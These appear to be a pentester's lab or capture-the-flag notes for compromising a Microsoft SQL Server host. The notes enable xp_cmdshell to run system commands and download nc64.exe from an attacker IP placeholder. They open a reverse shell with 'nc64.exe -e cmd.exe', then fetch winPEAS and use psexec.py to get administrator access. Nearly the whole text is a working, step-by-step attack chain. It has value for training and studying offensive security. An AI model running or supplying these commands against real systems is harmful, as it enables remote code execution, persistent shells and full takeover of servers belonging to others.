# check what is the role we have in the server
SELECT is_srvrolemember('sysadmin');

# check if the xp_cmdshell  is already activated by issuing the first command
EXEC xp_cmdshell 'net user';

# activation of xp_cmdshell (if it's not activated yet)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; # Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Now we are able to execute system commands
xp_cmdshell "whoami"

# get a stable reverse shell. We will upload the nc64.exe binary to the target 
# machine and execute an interactive cmd.exe  process on our listening port.
sudo python3 -m http.server 80
sudo nc -lvnp 443 
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{IP_ADDRESS}/nc64.exe -outfile nc64.exe"

# bind the cmd.exe through the nc to our listener
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {IP_ADDRESS} 443"

# once shell is posessed, windows privesc is the following
powershell
# start the python server
wget http://{IP_ADDR}/winPEASx64.exe -outfile winPEASx64.exe
# exec the binary
PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
# get shell as the administrator
psexec.py administrator@{TARGET_IP}
